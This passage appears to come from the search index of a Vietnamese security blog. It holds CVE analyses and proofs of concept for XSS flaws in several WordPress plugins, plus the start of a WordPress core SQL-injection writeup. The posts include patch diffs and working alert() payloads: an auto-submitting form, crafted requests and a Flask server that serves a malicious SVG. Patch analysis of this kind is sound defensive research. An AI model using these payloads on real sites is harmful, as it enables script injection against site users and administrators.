$item-\u003emodel; ?\u003e \u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003c?php endforeach; ?\u003e \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c?php else : ?\u003e \u003cdiv class=\"o-wrap o-wrap--no-data wps-center\"\u003e \u003c?php esc_html_e('No recent data available.', 'wp-statistics'); ?\u003e \u003c/div\u003e \u003c?php endif; ?\u003e \u003c/div\u003e Nếu $data không rỗng thì duyệt qua $data và hiển thị dữ liệu đã thống kê của visitors, bao gồm model. Nếu rỗng thì in ra No recent data available. public static function isUnknown($value) { if (empty($value) or $value == 'Unknown' or $value == __(\"Unknown\", 'wp-statistics')) { return true; }","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress All in One Time Clock Lite Plugin.","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng Reflected Cross-Site Scripting (XSS) trong plugin All in One Time Clock Lite cho WordPress. Lỗ hổng xuất phát từ tham số nonce ở các phiên bản đến và bao gồm 2.0, do xử lý đầu vào không đầy đủ và không escape đầu ra. Kẻ tấn công (kể cả không xác thực) có thể chèn các đoạn script tùy ý vào trang; những script này sẽ được thực thi khi nạn nhân thực hiện hành động bị thao túng (ví dụ: bấm vào một liên kết). CVE ID: CVE-2025-6832 Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 2.0 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress All in One Time Clock Lite Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - All in One Time Clock Lite: v2.0 (vulnerable) và v2.0.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Analysis Patch diff Trong phiên bản vulnerable, tham số nonce được lấy trực tiếp từ $_POST mà không qua bất kỳ sanitization nào: $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; Trong phiên bản patched, tham số nonce được xử lý bằng sanitize_text_field() trước khi sử dụng, ngăn chặn việc chèn mã độc: $nonce = (isset($_POST[\"nonce\"])) ? sanitize_text_field($_POST[\"nonce\"]) : null; 👉 Bản vá bổ sung lớp lọc đầu vào cho biến nonce, đảm bảo dữ liệu nhận từ request sẽ được loại bỏ ký tự nguy hiểm trước khi xử lý tiếp. So sánh thay đổi mã giữa bản vulnerable và bản vá Vulnerable code Lỗ hổng nằm trong hàm aio_time_clock_lite_js() thuộc class AIO_Time_Clock_Lite_Actions trong file aio-time-clock-lite-actions.php{: .filepath} public function aio_time_clock_lite_js() { // other logic $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; if (wp_verify_nonce($nonce, 'time-clock-nonce')) { // other logic } else { echo json_encode( [ \"response\" =\u003e \"failed\", \"message\" =\u003e esc_attr_x(\"Not authorized to perform this action\", 'aio-time-clock-lite'), \"nonce\" =\u003e $nonce, \"clock_action\" =\u003e $clock_action, ] ); } wp_reset_postdata(); die(); } {: file=“aio-time-clock-lite-actions.php”} Hàm wp_verify_nonce() so sánh giá trị $nonce gửi từ client với giá trị hợp lệ mà server đã sinh ra trước đó bằng hàm wp_create_nonce(). \u003cinput type=\"hidden\" name=\"time-clock-nonce\" id=\"time-clock-nonce\" value=\"\u003c?php echo wp_create_nonce(\"time-clock-nonce\"); ?\u003e\"\u003e {: file=“aio-settings.php”} Nếu $nonce không hợp lệ =\u003e nhảy sang nhánh else trả về JSON báo lỗi chứa $nonce. Click 2 references ta thấy hàm public function aio_time_clock_lite_js() được gọi làm callback cho các action hook: Hàm aio_time_clock_lite_js() được gắn vào hai hook Ajax (authenticated \u0026 unauthenticated) wp_ajax_aio_time_clock_lite_js(authenticated). wp_ajax_nopriv_aio_time_clock_lite_js(unauthenticated). =\u003e Focus Sources \u0026 Sinks Source: Tham số nonce lấy trực tiếp từ $_POST (unauthenticated request). Sink: Giá trị nonce được phản chiếu lại trong echo json_encode(...). Flow Gửi POST request (unauthenticated) đến /wp-admin/admin-ajax.php với các params: action=aio_time_clock_lite_js\u0026nonce=nonce_value Callback aio_time_clock_lite_js() được gọi Kiểm tra giá trị nonce =\u003e invalid Phản chiếu giá trị nonce vào body bằng echo json_encode(...) Exploit Proof of Concept (PoC) Tạo trang web chứa form submit: \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"post\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"aio_time_clock_lite_js\"\u003e \u003cinput type=\"hidden\" name=\"nonce\" value=\"\u003csvg onload=alert()\u003e\"\u003e \u003c/form\u003e \u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e Gửi link đến trang web chứa form cho người dùng cho dặc quyền. Quan sát việc thực hiện JavaScript được tiêm. Result — PoC execution screenshot Conclusion Lỗ hổng CVE-2025-6832 trong plugin All in One Time Clock Lite \u003c= 2.0 cho phép unauthenticated attacker khai thác Reflected XSS thông qua tham số nonce. Bản vá 2.0.1 đã thêm sanitize_text_field() để lọc input, ngăn chặn mã độc được phản chiếu trong JSON response. Key takeaways: Luôn sanitize và escape dữ liệu trước khi trả về","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Download Manager Plugin.","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng trong plugin Download Manager trước phiên bản 3.3.24. Dữ liệu được lấy từ GET request được in trực tiếp vào HTML attribute, reflected XSS xảy ra khi người dùng có đặc quyền truy cập vào đường dẫn do attack cung cấp. CVE ID: CVE-2025-10146 Product: WordPress Download Manager Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.3.23 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Download Manager: v3.3.23(vul) và v3.3.24(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file src/Admin/views/stats/history.php. Bản lỗi: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Lấy GET params và gán trực tiếp vào href của thẻ \u003ca\u003e mà không có cơ chế bảo vệ =\u003e nguy cơ reflected XSS. Bản vá: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $get_params_xu = \\WPDM\\__\\__::sanitize_array($get_params_xu, 'safetxt'); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo esc_url($reset_url); ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Patch Diff: sanitized GET parameters and escaped URL Bản vá đã sanitize mảng GET params bằng sanitize_array và sử dụng esc_url để escape URL =\u003e an toàn hơn. How It Work? Ta cần tìm URL thực sự để inject GET params chứa XSS payload. src/Admin/views/stats/history.php chứa các tag php, HTML và nằm trong views cho thấy file này được include ở nơi nào đó trong mã nguồn plugin. Ta tìm với từ khóa history.php trong thư mục plugin Search results for history.php 👉 Không có kết quả nào khớp. Khả năng cao nó được include động như này {$file_name}.php. Ta tìm với regex \\{.*\\}\\.php: Regex search for dynamic includes src/Admin/views/stats/history.php được include trong src/Admin/views/stats.php URL thực sự để truy cập được khai báo ở đầu file stats.php $base_page_uri = \"edit.php?post_type=wpdmpro\u0026page=wpdm-stats\"; Tương tự history.php, stats.php cũng được include ở đâu đó trong mã nguồn plugin. Nhưng không cần quan tâm vì ta đã tìm được URL thực sự. Để chắc chắn hơn, ta đặt breakpoint tại vị trí lỗ hổng trong file src/Admin/views/stats/history.php, sau đó bắt đầu debug và truy cập URL: edit.php?post_type=wpdmpro\u0026page=wpdm-stats Breakpoint debugging to observe GET params Trước tiên, plugin lấy toàn bộ GET parameters vào $get_params. Nếu $user_ids không rỗng, plugin sẽ tạo nút “Clear filter”. Để làm nút này hoạt động, cần một URL mà không còn user_ids nữa, nên plugin làm như sau: $get_params_xu = $get_params; // copy toàn bộ GET parameters unset($get_params_xu['user_ids']); // bỏ user_ids ra khỏi mảng $reset_url = add_query_arg($get_params_xu, 'edit.php'); // tạo URL mới unset($get_params_xu['user_ids']) =\u003e loại bỏ bộ lọc user_ids khỏi URL. add_query_arg($get_params_xu, 'edit.php') \u003e tạo URL mới với các tham số còn lại. Cuối cùng, URL này được gắn vào nút “Clear filter”: \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\"\u003e...\u003c/a\u003e Kết quả: Khi người dùng nhấn nút, trang sẽ load lại mà không còn bộ lọc user_ids, tức là “clear filter”. Exploit Detect XSS Gửi GET request chứa XSS payload: GET /wp-admin/edit.php?post_type=wpdmpro\u0026page=wpdm-stats\u0026user_ids[0]=1\u0026payload=\"\u003e\u003c/a\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e HTTP/1.1 Ta thêm \"\u003e\u003c/a\u003e để đóng thẻ \u003ca\u003e sau đó thêm 1 script dể alert() Reflected XSS triggered via GET parameter 👉 XSS thành công, khi người dùng có","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress ShopLentor Plugin.","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng trong plugin ShopLentor trước phiên bản 3.2.0 cho phép kẻ tấn công có quyền contributor chèn mã độc vào CSS của block. CSS này sau đó được nạp inline vào trang và có khả năng dẫn tới Stored XSS khi được preview hoặc hiển thị trong trình duyệt. CVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.2.0 CVSS severity: Low (6.5) Required Privilege: Contributor Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. ShopLentor: v3.2.0(vul) và v3.2.1(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Actived WooCommerce plugin: plugin bắt buộc actived trước khi cài ShopLentor Plugin Analysis Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file woolentor-blocks/includes/classes/Manage_Styles.php. Bản lỗi: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Không kiểm tra quyền user // Không lọc nội dung CSS trước khi lưu update_post_meta( $post_id, '_woolentor_css', $params['block_css'] ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $params['block_css'] ); } Bản vá: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Chỉ admin hoặc tác giả bài viết mới được phép $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can('manage_options') \u0026\u0026 get_current_user_id() !== (int) $post-\u003epost_author ) ) { return ['success' =\u003e false, 'message' =\u003e __('No permission')]; } // Lọc dữ liệu trước khi lưu $block_css = $this-\u003esanitize_css_content( $params['block_css'] ); update_post_meta( $post_id, '_woolentor_css', $block_css ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $block_css ); } Bản vá dùng current_user_can(manage_options) để kiểm tra có phải admin không Nếu user là admin =\u003e vế đầu ! current_user_can('manage_options') = false =\u003e cả biểu thức \u0026\u0026 = false =\u003e qua được. Nếu user là author =\u003e vế sau get_current_user_id() !== (int) $post-\u003epost_author = false =\u003e cả biểu thức \u0026\u0026 = false =\u003e qua được. Patch Diff How It Work? public function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); if ( $post_id == 'woolentor-widget' \u0026\u0026 $params['has_block'] ) { update_option( $post_id, $params['block_css'] ); return [ 'success' =\u003e true, 'message' =\u003e __('Widget CSS Saved.', 'woolentor') ]; } $filename = \"woolentor-css-{$post_id}.css\"; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/'; if ( $params['has_block'] ) { update_post_meta( $post_id, '_woolentor_active', 'yes' ); $all_block_css = $params['block_css']; WP_Filesystem( false, $upload_dir_url['basedir'], true ); if( ! $wp_filesystem-\u003eis_dir( $dirname ) ) { $wp_filesystem-\u003emkdir( $dirname ); } update_post_meta( $post_id, '_woolentor_css', $all_block_css ); if ( ! $wp_filesystem-\u003eput_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); } return [ 'success' =\u003e true, 'message' =\u003e__('WooLentor Blocks css file update.', 'woolentor' ) ]; } else { delete_post_meta( $post_id, '_woolentor_active' ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, '_woolentor_css' ); return [ 'success' =\u003e true, 'message' =\u003e __('WooLentor Blocks CSS Delete.', 'woolentor' ) ]; } } catch( \\Exception $e ){ return [ 'success' =\u003e false, 'message' =\u003e $e-\u003egetMessage() ]; } } Hàm save_block_css() thuộc class Manage_Styles có nhiệm vụ lưu hoặc xóa CSS tuỳ theo block. Ứng dụng sẽ lấy post_id và nội dung block_css từ request. Trường hợp đặc biệt: nếu pos","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Authorsy Plugin.","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Authorsy của WordPress trước phiên bản 1.0.6. Điều này có thể cho phép kẻ tấn công chèn mã độc (ví dụ: script chuyển hướng, quảng cáo, hoặc các payload HTML khác) vào website, và những mã đó sẽ được thực thi khi khách truy cập mở trang. CVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Trong mô tả yêu cầu đặc quyền Subscriber nhưng thực ra có thể khai thác Unauthenticated. Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Authorsy: v1.0.5(vul) và v1.0.6(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng có chức năng tùy chỉnh CSS, lưu dữ liệu trong wp_options và chèn trực tiếp vào \u003cstyle\u003e trên trang. Tuy nhiên, người dùng có thể tương tác với API để chỉnh sửa dữ liệu CSS mà không bị kiểm soát quyền, dẫn đến nguy cơ Broken Access Control và có thể XSS nếu chèn payload độc hại. Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở 2 file core/settings/api-settings.php và core/enqueue-inline/enqueue-inline.php Diff showing changes in enqueue-inline.php to sanitize custom CSS Diff showing REST API permission callback changes in api-settings.php Exploit Detect XSS Gửi POST request đến /wp-json/authorsy/v1/settings với XSS payload: POST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \"primary_color\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Ta đóng thẻ \u003cstyle\u003e (CSS trong head) và inject thêm thẻ \u003cscript\u003e chứa XSS payload. Truy cập một trang bất kỳ. XSS payload injected via custom CSS 👉 XSS thành công, inspect để xem code được thay đổi như nào. \u003cstyle\u003e :root { --ea-color-main: \u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e; } \u003c/style\u003e Conclusion Lỗ hổng CVE-2025-27006 trong plugin Authorsy \u003c= 1.0.5 là một ví dụ điển hình về Broken Access Control kết hợp với XSS. Nguyên nhân chính là: REST API không kiểm soát quyền truy cập: bất kỳ user nào cũng có thể gọi /wp-json/authorsy/v1/settings để thay đổi các option. CSS tùy chỉnh chưa được sanitize: giá trị CSS được chèn trực tiếp vào \u003cstyle\u003e trong \u003chead\u003e, cho phép kẻ tấn công inject payload \u003cscript\u003e thông qua CSS. Nonce không được xử lý đúng: verify_nonce chỉ trả về WP_Error mà không ngăn code thực thi, khiến việc kiểm tra bảo mật gần như vô hiệu. Key takeaways: REST API cần kiểm soát quyền: luôn sử dụng permission_callback hợp lý để ngăn Broken Access Control. Sanitize dữ liệu người dùng trước khi render trong HTML/CSS/JS để phòng XSS. References Cross-site scripting (XSS) cheat sheet WordPress Authorsy Plugin \u003c= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Assistant Plugin.","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Assistant của WordPress trước phiên bản 3.6.2. Điều này có thể cho phép kẻ tấn công chèn mã độc (ví dụ: script chuyển hướng, quảng cáo, hoặc các payload HTML khác) vào website, và những mã đó sẽ được thực thi khi khách truy cập mở trang. CVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Assistant: v1.5.2(vul) và v1.5.3(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng hiển thị trực tiếp nội dung hình ảnh do người dùng cung cấp thông qua URL mà không xác thực và kiểm tra đầy đủ MIME type. Điều này dẫn đến việc kẻ tấn công có thể cung cấp một tập tin giả dạng hình ảnh và khi được trình duyệt xử lý, nó sẽ thực thi mã độc =\u003e gây ra lỗ hổng XSS. Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Diff giữa bản lỗi và bản vá Trong trường hợp này, sự khác biệt giữa 2 phiên bản khá nhiều, để thuận lợi cho việc truy vết, ta có thể xem change log để biết bản vá lỗ hổng XSS ở đâu: Changelog 1.5.3 ( 2025-09-08 ) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \"image proxy\" 👉 Lỗ hỗng nằm trong file backend/src/Hooks/ImageProxy.php, ta quan sát sự khác biệt của 2 phiên bản: Sự khác biệt trong hàm render_image của ImageProxy.php Sự thay đổi xảy ra ở hàm render_image với chức năng: Nhận tham số url từ query string ($_GET['url']). Gửi request từ server đến URL đó để tải nội dung. Chống ssrf bằng wp_safe_remote_get. Nếu nội dung có header Content-Type bắt đầu bằng image/, thì: Gửi lại header Content-Type đó cho client. In (echo) toàn bộ nội dung file ra cho trình duyệt. Trình duyệt hiển thị hình ảnh không phải trực tiếp từ nguồn gốc mà thông qua server WordPress. SVG cũng có Content-Type bắt đầu bằng image/ và có thể chứa mã JavaScript bên trong =\u003e XSS có thể xảy ra. Bản vá đã thêm một lớp kiểm tra MIME type thực sự của file để tránh kịch bản XSS bằng SVG hay file giả mạo. $filesystem = self::filesystem(); $tmpfile = tempnam( '/tmp', 'assistant' ); $filesystem-\u003eput_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u003edelete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() sử dụng hàm xử lý ảnh nội bộ (dựa trên dữ liệu binary của file) để xác định MIME thực sự. Nếu kết quả không phải là ảnh hợp lệ =\u003e return false. How it work? Trong __construct của class ImageProxy, phương thức render_image() được gọi thông qua callback của action hook 'init'. Hook 'init' được thực thi rất sớm trong quá trình load WordPress, sau khi các đối tượng core được khởi tạo nhưng trước khi gửi output ra trình duyệt. render_image chỉ được gọi khi người dùng hiện tại có quyền chỉnh sửa bài viết của người khác và tham số $_GET['fl_asst_image_proxy'] tồn tại. 👉 Khi truy cập /wp-admin/?fl_asst_image_proxy=value1\u0026url=http://yoursite/image-path thì render_image sẽ được gọi và trả về nội dung hình ảnh cho trình duyệt hiển thị. Exploit Detect XSS Tạo 1 trang web đơn giản trả về nội dung SVG chứa XSS payload from flask import Flask, Response app = Flask(__name__) @app.route('/') def home(): return 'Hello, World!' @app.route('/svg') def about(): svg = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cscript\u003ealert(document.domain)\u003c/script\u003e \u003c/svg\u003e\"\"\" return Response(svg, mimetype=\"image/svg+xml\") Gửi request chứa url param trỏ đến https://yoursite/svg http://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026url=https://yoursite/svg 👉 Thành công với Unauthenticated vì chỉ cần người dùng có quyền, khi truy cập url =\u003e XSS xảy ra trên trình duyệt của nạn nhân. Attacker không cần đăng nhập. SVG chứa XSS payload được hiển thị qua image ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Lỗ hổng xảy ra trên plugin Hostel của WordPress trước phiên bản 1.1.5.8. Kẻ tấn công có thể lợi dụng lỗ hổng này để tấn công người dùng có quyền cao như admin. CVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.7(vul) và v1.1.5.8(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version Analysis Nguyên nhân gốc rễ do không thực hiện sanitize (làm sạch dữ liệu) và escape (mã hóa dữ liệu đầu ra) đối với một tham số trước khi phản hồi lại trên trang, dẫn đến lỗ hổng Reflected Cross-Site Scripting (XSS) Patch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở 2 file views/bookings.html.php và controllers/bookings.php File views/bookings.html.php \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e Tham số ob được lấy trực tiếp từ $_GET['ob'] và echo ra HTML attribute mà không có bất kì xử lý escape nào. Điều này dẫn đến nguy cơ Reflected XSS (Cross-Site Scripting), vì attacker có thể chèn payload vào query string, \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e Bản vá đã sử dụng hàm esc_attr() để encode $_GET['ob'] thành dạng an toàn trước khi echo ra HTML attribute. Diff giữa code dễ bị lỗi và code đã vá Source: $_GET['ob'] là dữ liệu nhập từ client (URL query string), attacker có thể kiểm soát hoàn toàn. Sink: echo trong HTML attribute ob=\u003c?php echo @$_GET['ob']?\u003e 👉 Vì source không đi qua logic của controllers nên ta không cần quan tâm diff của controllers/bookings.php How it work? Để $_GET['ob'] được echo ra HTML attribute của thẻ \u003ca\u003e thì điều kiện trong khối if chứa thẻ \u003ca\u003e phải true \u003c?php if($offset \u003e 0):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e 👉 Điều kiện quan trọng cần chú ý là if($offset \u003e 0), vì chỉ cần điều kiện này đúng thì XSS đã có thể xảy ra. Không cần quan tâm if($count \u003e ($page_limit + $offset)). File views/bookings.html.php không thể truy cập trực tiếp, mà phải được controllers gọi thông qua hàm include() Biến $offset được controller khởi tạo trước rồi truyền sang view (views/bookings.html.php) để dùng trong mệnh đề if. Để xác định controller nào gọi file view này, ta tìm kiếm biến $offset trong thư mục controllers của plugin. Tìm biến $offset trong thư mục controllers Kết quả cho thấy $offset được tạo trong nhánh default (listing bookings) của hàm tĩnh manage() trong class WPHostelBookings, nằm ở file controllers/bookings.php. Controller Code class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']); $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); $dir = empty($_GET['d","date":"2025-10-02","objectID":"/vi/posts/2025-10-02-cve-2025-6234/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/vi/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analyst"],"content":"Do việc làm sạch dữ liệu (sanitization) không đúng cách trong WP_Query, có những trường hợp có thể xảy ra SQL Injection thông qua các plugin hoặc theme sử dụng nó theo một cách nhất định. Lỗ hổng này đã được vá trong WordPress phiên bản 5.8.3. Các phiên bản cũ hơn bị ảnh hưởng cũng đã được sửa thông qua bản phát hành bảo mật, quay ngược lại đến tận phiên bản 3.7.37. CVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ≤ version \u003c 5.8.3 CVSS severity: High (8.0) Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress: v5.8.2(vul) Setup 